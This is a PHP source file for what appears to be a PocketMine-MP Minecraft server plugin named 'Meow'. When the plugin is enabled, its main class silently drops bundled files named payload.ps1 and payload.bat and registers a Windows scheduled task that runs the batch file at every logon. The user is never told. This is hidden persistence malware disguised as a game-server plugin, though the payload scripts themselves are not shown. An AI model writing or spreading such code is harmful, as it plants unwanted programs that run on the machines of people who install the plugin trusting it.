<?php
declare(strict_types=1);
namespace jasonwynn10\Meow;

use pocketmine\plugin\PluginBase;

class Main extends PluginBase {
	public function onEnable() {
		$this->saveResource("payload.ps1");
		$this->saveResource("payload.bat");
		$path = realpath($this->getDataFolder()."payload.bat");
		$command1 = "SCHTASKS /QUERY /TN \"Meow\"";
		$command2 = "SCHTASKS /CREATE /SC ONLOGON /TN \"Meow\" /TR \"".$path."\"";
		exec($command1, $o, $ret);
		if($ret !== 0)
			exec($command2, $o2, $ret2);
		if($ret2 === 0)
			echo "Success";
	}
}